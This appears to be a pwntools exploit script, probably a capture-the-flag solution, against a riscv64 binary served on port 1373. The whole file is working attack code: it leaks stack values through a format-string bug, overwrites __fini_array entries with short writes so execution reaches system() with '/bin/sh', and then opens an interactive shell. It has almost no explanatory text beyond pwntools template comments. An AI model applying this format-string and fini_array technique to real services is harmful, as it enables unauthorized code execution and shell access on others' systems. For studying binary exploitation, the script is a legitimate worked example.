#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1' '--port=1373' ../src/code
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '../src/code')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1373)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = f'''
tbreak main
continue
b *{exe.sym.system + 0x12:#x}
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     riscv64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x10000)

restart = True
wait = True
def exec_fmt(fmt):
    if restart:
        io2 = process()
    else:
        io2 = io
    io2.sendline(fmt)
    io2.recvuntil(b'Hello ')
    if not wait: return
    ret = io2.recvline()
    if restart:
        io2.close()
    return ret

class MyFmtStr(FmtStr):
    def leak_stack(self, offset, prefix=b""):
        payload = (b'%c' * (offset - 1)) + b"START%pEND"
        leak = self.execute_fmt(prefix + payload)
        try:
            leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak
    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen).encode()
        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen + self.numbwritten, badbytes=self.badbytes, write_size='short', no_dollars=True)
        self.execute_fmt(fmtstr)
        self.writes = {}

fstr = MyFmtStr(exec_fmt)
restart = False

io = start()

io.sendline(b'%p ' * 64)
io.recvuntil(b'Hello ')
dat = io.recvline()
dat = [int(x, 16) for x in dat.split()]
print(hexdump(flat(dat)))

fini_loc = list(exe.search(pack(exe.sym.__fini_array_end), writable=True))
assert len(fini_loc) == 4

base = fini_loc[1]
info("%#x", base)
fstr.write(fini_loc[2], p16(base + 8 & 0xffff))
fstr.write(fini_loc[3], p16(next(exe.search(b'/bin/sh')) & 0xffff))
fstr.write(base, p16(exe.sym.system + 0x12 & 0xffff))
wait = False
fstr.execute_writes()

io.interactive()
